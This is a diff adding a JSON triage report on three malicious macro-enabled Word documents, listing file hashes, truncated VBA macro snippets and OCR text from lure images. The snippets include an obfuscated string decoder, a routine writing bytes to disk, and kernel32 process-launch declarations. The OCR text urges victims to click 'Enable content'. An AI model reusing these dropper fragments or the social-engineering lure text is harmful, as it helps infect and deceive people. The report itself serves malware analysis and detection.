@@ -1,0 +1,60 @@
+[
+    {
+        "file_name": "1bdbb2a88fc9b48a4d29ae76aafadf16.docx",
+        "sha256": "c30977d86a5f4e84a84435a29580c7bf39f1f5818fcb1d521d0028195cb0582a",
+        "has_macros": true,
+        "macro_snippets": [
+            "Attribute VB_Name = \"ThisDocument\"\r\nAttribute VB_Base = \"1Normal.ThisDocument\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = True\r\nAttribute VB_Customizable = True\r\n",
+            "Attribute VB_Name = \"encountered\"\r\nPrivate Const STARTF_USESHOWWINDOW& = &H1\r\nPrivate Const NORMAL_PRIORITY_CLASS = &H20&\r\nPrivate Const INFINITE = -1&\r\n\r\nPrivate Type STARTUPINFO\r\n    cb As Long\r\n    lpReserved As String\r\n    lpDesktop As String\r\n    lpTitle As String\r\n    dwX As Long\r\n    dwY As L",
+            "Attribute VB_Name = \"suggestions\"\r\nAttribute VB_Base = \"0{8110565B-91F3-472A-8873-1277EB16E094}{CF590736-BF5B-4356-BDD7-BE5E39D8FD76}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDerived ",
+            "Attribute VB_Name = \"visualizations\"\r\n\r\n\r\n#If VBA7 Then\r\n\r\n\r\n Declare PtrSafe Function AllocConsole Lib \"kernel32\" () As LongPtr\r\n Declare PtrSafe Function FreeConsole Lib \"kernel32\" () As LongPtr\r\n    Declare PtrSafe Function CloseHandle Lib \"kernel32\" (ByVal hObject As LongPtr) As LongPtr\r\n    Dec",
+            "Attribute VB_Name = \"gradient\"\r\nAttribute VB_Base = \"0{8E2242A5-8D7E-4112-A29B-0E07ACD379DE}{584BB7D4-B90F-410E-B74C-486294B13CF5}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDerived = F",
+            "Attribute VB_Name = \"FoldEpic\"\r\nAttribute VB_Base = \"0{049455BE-FC6A-4DDB-B0AD-5311BCFABA96}{C9A561EC-38FC-4A0A-ABA2-3A0994A7BDCA}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDerived = F",
+            "Attribute VB_Name = \"CdInfoComponate\"\r\nAttribute VB_Base = \"0{43824E85-4F49-4566-8893-53D20C818EC6}{EFB76C6C-E716-4740-90A5-698018E9E8B3}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDeri"
+        ],
+        "images_found": 2,
+        "ocr_results": {
+            "image2.png": "This document was created with an older\nversion of Microsoft Office\n\nThis document is only availible for desktop and laptop versions of\nMicrosoft Office Word.\n\nClick \u201cEnable editing\" button from the yellow bar above\n\nOnce you have enabled editing, please click \"Enable content\"\nbutton from the yellow bar above",
+            "image1.png": "This document was created with an older\nversion of Microsoft Office\n\nThis document is only availible for desktop and laptop versions of\nMicrosoft Office Word.\n\nClick \u201cEnable editing\" button from the yellow bar above\n\nOnce you have enabled editing, please click \"Enable content\"\nbutton from the yellow bar above"
+        }
+    },
+    {
+        "file_name": "240c5875a9ba744f6c61ff42a4d7d999.docx",
+        "sha256": "d57acf8eb7c1d9b23299042ccac8a7f16cb185994232827993cee8b212c68702",
+        "has_macros": true,
+        "macro_snippets": [
+            "Attribute VB_Name = \"ThisDocument\"\r\nAttribute VB_Base = \"1Normal.ThisDocument\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = True\r\nAttribute VB_Customizable = True\r\nAttribute VB_Co"
+        ],
+        "images_found": 4,
+        "ocr_results": {
+            "image3.wmf": "OCR Error: Unsupported image format/type",
+            "image4.png": "",
+            "image2.wmf": "OCR Error: Unsupported image format/type",
+            "image1.png": "ee ee: Doct_NEW_LAST22343 [Compatibility Mode] - Word PICTURE TOOLS\nHOME INSERT DESIGN \u2014-PAGELAYOUT REFERENCES = MAILINGS | REVIEW | VIEW FORMAT\nR\n\nLN} P \"\nv I [EE] Ags ev KE So BS Sint vanup y A \u00a3) Previous & fa\n\nSH E&\n\n\u2018ow Markup > Dy Net\nSpelling & Define Thesaurus Word Translate Language New Delete Previous Nex Show Track. Accept Reject Compare Block Restrict\nGrammar Count = ~ Comment Comments Changes [BI Reviewing Pane ~ Authors Editing\nProofing language Comments Tracking & Changes Compare Protect\nB| g t 4\nLI Ba Copy\nPaste . BI U-a&x, x / \u00a3\n+ Format Painter =\nClipboard GS Font & Paragraph\n\nEnable Content\n\n\u2014\u2014\u2014> \u00b0\n\nns npocmotpa Bcex COCHOBHbIX U3MeHEHN, HarxKMUTe KHonky Enable Content\n(BknrounTb cofepKumMoe)\n\n7H - ax\n\nsignin FO\n\nTaka"
+        }
+    },
+    {
+        "file_name": "46b138cf8645b457b2a8c4ebc79e06f1.docx",
+        "sha256": "745b0e0793fc507d9e1ad7155beb7ac48f8a556e6ef06e43888cbefec3083f2f",
+        "has_macros": true,
+        "macro_snippets": [
+            "Attribute VB_Name = \"ThisDocument\"\r\nAttribute VB_Base = \"1Normal.ThisDocument\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = True\r\nAttribute VB_Customizable = True\r\n",
+            "Attribute VB_Name = \"EjRhGuEWGBOUE\"\r\nPublic lus(0 To 2623) As String\r\nFunction QWERWRERQ()\r\nZXCPIO\r\nILPUZZZZZRTY = FreeFile\r\nDim Bytes() As Byte\r\nDim RWEIOPAL As Integer\r\nOpen Environ(DRTYUIUU(\"*;5,H*>G?D)C(7@\")) & DRTYUIUU(\"*H*>8*NNG2*O16-*6B.-\") For Binary Lock Write As #ILPUZZZZZRTY\r\nFor I = LBou",
+            "Attribute VB_Name = \"ZDUHFOWERUHFOPW\"\r\nFunction AAB(sd)\r\n    For I = 0 To sd\r\n     Selection.TypeText Text:=\" \"\r\n     Selection.TypeBackspace\r\n     Selection.TypeBackspace\r\n     Selection.TypeBackspace\r\n     Selection.TypeBackspace\r\n     Selection.TypeBackspace\r\n     Selection.TypeBackspace\r\n Next\r\n",
+            "Attribute VB_Name = \"EWRJKLGJHRUIE\"\r\nFunction DRTYUIUU(ByVal bbbb)\r\noutput = \"\"\r\nc = 0\r\nr = 1\r\nWhile r < 16777215\r\nr = r * 40\r\nc = c + 1\r\nWend\r\nFor I = 1 To Len(bbbb)\r\nValue = Value * 40 + (Asc(Mid(bbbb, I, 1)) - 40)\r\nIf I Mod c = 0 Then\r\nWhile Value > 0\r\nv = Value Mod 256\r\nIf v > 0 Then\r\noutput = C",
+            "Attribute VB_Name = \"JDFRTZAQW\"\r\nAttribute VB_Base = \"0{3F2C085D-3F7E-49AB-8065-83831A9EF0F7}{8BF7F07B-2B1D-43A5-9AFF-EDF2045CBFAB}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDerived = ",
+            "Attribute VB_Name = \"AQYUIBN\"\r\nAttribute VB_Base = \"0{EF286235-1376-4350-B5A9-F4BA512CA67C}{C2900608-78A5-487C-865D-87B16FAEDF1B}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDerived = Fa",
+            "Attribute VB_Name = \"KYUFGREFFG\"\r\nAttribute VB_Base = \"0{6AA60754-875A-479C-8662-E8E12A9EF246}{BCA17F11-075E-44C9-A4C3-CFD6AE4B808F}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDerived =",
+            "Attribute VB_Name = \"QWERTYASCV\"\r\nAttribute VB_Base = \"0{E0939A0A-8B4A-4183-BF5E-91715ECA6475}{CEEFB67C-C910-4A4E-B73B-6877ADC649AB}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDerived =",
+            "Attribute VB_Name = \"BASDUYTE\"\r\nAttribute VB_Base = \"0{3720F548-CFBB-4389-ABA2-5AB3859F8DE3}{20B1A28D-AC50-40A7-80FC-EB3C5948C7A2}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDerived = F",
+            "Attribute VB_Name = \"CDWKUYGASZXCXERGF\"\r\nAttribute VB_Base = \"0{DA0B4820-8436-416F-9AC0-97E180726369}{3A53419E-B586-4B18-8461-C9AC4E1BA65F}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDe",
+            "Attribute VB_Name = \"WEERRTTY\"\r\nAttribute VB_Base = \"0{EB227229-33A0-44FA-8FDC-119826A1E19A}{8FB5357F-FF17-4859-A30E-8F7CDE0FA728}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDerived = F",
+            "Attribute VB_Name = \"XCVBASQWW\"\r\nAttribute VB_Base = \"0{C1A6F6C7-A132-40AC-9D5F-F5746405C0E0}{3C292EF4-26C3-489C-A904-4B948E80683F}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDerived = ",
+            "Attribute VB_Name = \"RUYIRTGFGTGFG\"\r\nFunction fibonacci(ByVal zahl As Long)\r\n\r\nIf zahl = 0 Then\r\n        fibonacci = 0\r\nEnd If\r\n\r\nIf zahl = 1 Then\r\n        fibonacci = 1\r\nEnd If\r\n\r\nDim a, b, c, c_tmp As Long\r\na = 0\r\nb = 1\r\nc = 0\r\nFor I = 2 To zahl\r\n        c_tmp = c\r\n        c = a + b\r\n        a = b"
+        ],
+        "images_found": 1,
+        "ocr_results": {
+            "image1.jpeg": "1) Office 365\nThis document created in online version of Microsoft Office Word\n\nTo view or edit this document, please click \"Enable editing\u201d button\n\u2018on the top yellow bar, and then click \"Enable content\u201d"
+        }
+    }
+]
